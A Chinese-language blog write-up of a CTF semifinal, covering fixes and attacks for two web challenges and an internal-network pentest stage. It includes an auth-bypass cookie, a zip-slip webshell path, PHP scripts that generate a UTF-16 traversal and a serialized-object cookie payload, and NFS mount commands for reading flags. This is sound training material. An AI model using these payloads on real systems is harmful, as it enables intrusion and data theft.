---
title: 2026CISCN&CCB 半决赛复盘
published: 2026-03-23
pubDate: 2026-03-23
description: ccb zsm wp
pinned: false
tags: ["web"]
author: zsm
category: ctf-web
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

决赛还是没进去，今年的awdp和isw里面的二进制内容太多了，没有pwn手，害

## awdp

### easy_time\*

#### fix

看`index.py`可以发现两个硬编码的很抽象的东西

```python
app.secret_key = "dev-secret-change-me"
if username == 'admin' and h2 == "7022cd14c42ff272619d6beacdc9ffde":
```

我第一开始直接选择用`sed`进行替换，按理来说鉴权就没法上去了，然后不太行，然后想了一下，python启动的东西是不自带热重启的，也就是你需要手动杀掉python的pid，然后再重新启动

这里shell脚本写好感觉无敌了，上传发现依旧防守失败。。。

正确修法应该是cookie更换为session管理，还有把safe_upload换成safe_extract_zip方法

#### break

打的时候我先爆破了一下密码，双重md5按理来说没人爆破来着()，密码是`secret`，弱密码好像是非预期？因为我直接爆破出来密码了，也导致我`fix`没有注意到这里

![image](./attachments/260327-151932.avif)

```python
def is_logged_in() -> bool:
    return flask.request.cookies.get("visited") == "yes" and bool(flask.request.cookies.get("user"))


def login_required(view):
    def wrapped(*args, **kwargs):
        if not is_logged_in():
            next_url = flask.request.full_path if flask.request.query_string else flask.request.path
            return flask.redirect(flask.url_for("login", next=next_url))
        return view(*args, **kwargs)

    wrapped.__name__ = view.__name__
    return wrapped
```

`cookie`检验的时候值判断里面`visited`是不是yes，`user`是admin就行，所以

> Cookie: visited=yes;user=admin;

所以这也是为什么我直接`sed`修不好的原因，太不细心了。。。。

登录上去后可以传压缩包、图片，这里看见远程头像功能

```python
def about():
    user = flask.request.cookies.get('user')

    conn = db()
    current = conn.execute('SELECT * FROM users WHERE username=?', (user,)).fetchone()
    about_text = current['about'] if current else ''
    avatar_local = current['avatar_local'] if current else ''
    avatar_url = current['avatar_url'] if current else ''

    if flask.request.method == 'POST':
        about_text = flask.request.form.get('about', '')
        avatar_url = flask.request.form.get('avatar_url', '')

        upload = flask.request.files.get('avatar_file')
        if upload and upload.filename:
            raw = upload.read()
            upload.seek(0)
            kind = sniff_image_type(raw)
            if kind not in {'png', 'jpeg', 'gif', 'webp'}:
                conn.close()
                return (
                    flask.render_template(
                        'about.html',
                        user=user,
                        about=about_text,
                        avatar_local=avatar_local,
                        avatar_url=avatar_url,
                        remote_info=fetch_remote_avatar_info(avatar_url),
                        error='头像文件必须是图片（png/jpg/gif/webp）',
                    ),
                    400,
                )

            fname = f"{uuid4().hex}.{ 'jpg' if kind == 'jpeg' else kind }"
            path = AVATAR_DIR / fname
            with open(path, 'wb') as f:
                f.write(raw)
            avatar_local = f"uploads/avatars/{fname}"

        conn.execute(
            'UPDATE users SET about=?, avatar_local=?, avatar_url=? WHERE username=?',
            (about_text, avatar_local, avatar_url, user),
        )
        conn.commit()

        current = conn.execute('SELECT * FROM users WHERE username=?', (user,)).fetchone()
        conn.close()

        return flask.render_template(
            'about.html',
            user=user,
            about=current['about'],
            avatar_local=current['avatar_local'],
            avatar_url=current['avatar_url'],
            remote_info=fetch_remote_avatar_info(current['avatar_url']),
            error=None,
        )

    conn.close()
    return flask.render_template(
        'about.html',
        user=user,
        about=about_text,
        avatar_local=avatar_local,
        avatar_url=avatar_url,
        remote_info=fetch_remote_avatar_info(avatar_url),
        error=None,
    )

```

尝试读取本地的图片马，发现连不上，附件里面有`phpinfo.php`，尝试读取，docker里面开的5000端口

发现成功读取到，但是没有flag，那么就等于我们需要传文件上去执行拿flag了，头像上传尝试后发现不太行，那只能是压缩包了

```python
def safe_upload(zip_path: Path, dest_dir: Path) -> list[str]:
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            target = os.path.join(dest_dir, info.filename)
            if info.is_dir():
                os.makedirs(target, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with open(target, 'wb') as f:
                    f.write(z.read(info.filename))

@app.route('/plugin/upload', methods=['GET', 'POST'])
@login_required
def upload_plugin():
    if flask.request.method == 'GET':
        return flask.render_template('plugin_upload.html', error=None, ok=None, files=None)

    file = flask.request.files.get('plugin')
    if not file or not file.filename:
        return flask.render_template('plugin_upload.html', error='请选择一个 zip 文件', ok=None, files=None), 400

    filename = secure_filename(file.filename)
    if not filename.lower().endswith('.zip'):
        return flask.render_template('plugin_upload.html', error='仅支持 .zip 文件', ok=None, files=None), 400

    saved = UPLOAD_DIR / f"{uuid4().hex}-{filename}"
    file.save(saved)

    dest = PLUGIN_DIR / f"{Path(filename).stem}-{uuid4().hex[:8]}"
    dest.mkdir(parents=True, exist_ok=True)

    try:
        print(saved, dest)
        extracted = safe_upload(saved, dest)
    except Exception:
        shutil.rmtree(dest, ignore_errors=True)
        return flask.render_template('plugin_upload.html', error='解压失败：压缩包内容不合法', ok=None, files=None), 400

    return flask.render_template('plugin_upload.html', error=None, ok='上传并解压成功', files=extracted)
```

可以发现上传后路径什么的是`uuid4`生成，结合题目名还以为和时间有关系，后面发现`uuid4`是纯随机，没有`time-seed`

实际上是目录穿越

> target = os.path.join(dest_dir, info.filename)

参数`info.filename`完全可控，那就等于可以写一个名字是`../../../../../var/www/html/shell.php`这种的文件去getshell

### MediaDrive

#### fix

看`preview.php`

```php
<?php
declare(strict_types=1);
require_once __DIR__ . "/lib/User.php";
require_once __DIR__ . "/lib/Util.php";

$user = null;
if (isset($_COOKIE['user'])) {
    $user = @unserialize($_COOKIE['user']);
}
if (!$user instanceof User) {
    $user = new User("guest");
    setcookie("user", serialize($user), time() + 86400, "/");
}

$f = (string)($_GET['f'] ?? "");
if ($f === "") {
    http_response_code(400);
    echo "Missing parameter: f";
    exit;
}

$rawPath = $user->basePath . $f;

if (preg_match('/flag|\/flag|\.\.|php:|data:|expect:/i', $rawPath)) {
    http_response_code(403);
    echo "Access denied";
    exit;
}

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);
if ($convertedPath === false || $convertedPath === "") {
    http_response_code(500);
    echo "Conversion failed";
    exit;
}

$content = @file_get_contents($convertedPath);
if ($content === false) {
    http_response_code(404);
    echo "Not found";
    exit;
}

$displayRaw = $rawPath;
$displayConv = $convertedPath;
$isText = true;

for ($i=0; $i<min(strlen($content), 512); $i++) {
    $c = ord($content[$i]);
    if ($c === 0) { $isText = false; break; }
}

?>
```

有`unserialize`反序列化的样子

> $convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);

可以路径穿越，那么修复的话，直接改这里就行

> $convertedPath = realpath(@iconv($user->encoding, "UTF-8//IGNORE", $rawPath));

#### break

`iconv`函数可以去`UTF-16`绕过

```php
<?php

$f = "/flag";
$convertedPath = iconv("UTF-8", "UTF-16", $f);
echo urlencode($convertedPath);
```

```php
<?php

class User {
    public string $name = "admin";
    public string $encoding = "UTF-16";
    public string $basePath = "";

    public function __construct(string $name = "admin") {
        $this->name = $name;
    }
}

echo urlencode(serialize(new User()));
```

## isw

### isw

fscan扫描可以发现打`Shiro`，工具一把梭，蚁剑连接上去，根目录拿flag

然后需要提权，有`CVE-2021-4034`可以提权，但是没存这玩意

内网进行fscan

```
192.168.45.100:88 open
192.168.45.100:53 open
192.168.45.100:22 open
192.168.45.100:139 open
192.168.45.100:135 open
192.168.45.100:111 open
192.168.45.100:464 open
192.168.45.100:445 open
192.168.45.100:389 open
192.168.45.100:636 open
192.168.45.100:2049 open
192.168.45.100:3269 open
192.168.45.100:3268 open
192.168.45.100:12345 open
192.168.45.100:20048 open
192.168.45.100:34483 open
192.168.45.100:49154 open
192.168.45.100:49153 open
192.168.45.100:49152 open
192.168.45.100:57291 open
```

有很多端口，但是当时sb了，一直挂不上去代理，看他们说是`2049`端口，是nfs服务的端口，可以挂载上去拿flag

```
Export list for 192.168.45.100:
/nfsdir *

mkdir /hack
mount -t 192.168.45.100:/nfsdir /hack -o nolock
cat /hack/flag
```

### isw1

任意文件读取漏洞可以读取到`/etc/shadow`，有`root`的密码但是爆破不出来，读取`/proc/self/cmdline`可以拿到`/root/pico/server80`，这个80是端口，读取二进制下来打pwn

有师傅说把盘读下来去取证也可以拿一个，太魔丸了xd

### isw2

`WatchAgent.exe`是个re，还是rpc，没有工具也不会连，放弃了

## 总结

今年不像去年了，去年只会web就可以拿到很高的分，今年需要更多的二进制的配合。。。。。。。

加油吧。。。。。

是最后一年了吗。。。。。。。。。

也许吧。
